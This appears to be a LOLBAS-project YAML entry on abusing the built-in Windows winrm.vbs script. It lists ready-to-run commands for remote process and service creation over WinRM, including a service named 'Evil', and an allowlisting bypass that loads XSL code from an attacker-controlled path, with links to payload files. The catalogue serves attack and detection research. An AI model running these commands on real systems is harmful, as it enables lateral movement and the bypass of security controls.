---
Name: winrm.vbs
Description: Script used for manage Windows RM settings
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: 'winrm invoke Create wmicimv2/Win32_Process @{CommandLine="notepad.exe"} -r:http://target:5985'
    Description: Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol
    Usecase: Proxy execution
    Category: Execute
    Privileges: User
    MitreID: T1216
    OperatingSystem: Windows 10
  - Command: 'winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="cmd.exe /k c:\windows\system32\notepad.exe"} -r:http://acmedc:5985   \nwinrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985'
    Description: Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol
    Usecase: Proxy execution
    Category: Execute
    Privileges: User
    MitreID: T1216
    OperatingSystem: Windows 10
  - Command: '%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty'
    Description: Bypass AWL solutions by copying and executing cscript.exe and malicious XSL documents from attacker controlled location
    Usecase: Execute aribtrary, unsigned code via XSL script
    Category: AWL Bypass
    Privileges: User
    MitreID: T1216
    OperatingSystem: Windows 10
Full_Path:
  - Path: C:\Windows\System32\winrm.vbs
  - Path: C:\Windows\SysWOW64\winrm.vbs
Code_Sample:
  - Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Slmgr.reg
  - Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Slmgr_calc.sct
Detection:
  - IOC:
Resources:
  - Link: https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
  - Link: https://www.youtube.com/watch?v=3gz1QmiMhss
  - Link: https://github.com/enigma0x3/windows-operating-system-archaeology
  - Link: https://redcanary.com/blog/lateral-movement-winrm-wmi/
  - Link: https://twitter.com/bohops/status/994405551751815170
  - Link: https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404
  - Link: https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
Acknowledgement:
  - Person: Matt Graeber
    Handle: '@mattifestation'
  - Person: Matt Nelson
    Handle: '@enigma0x3'
  - Person: Casey Smith
    Handle: '@subtee'
  - Person: Jimmy
    Handle: '@bohops'
  - Person: Red Canary Company cc Tony Lambert
    Handle: '@redcanaryco'
---
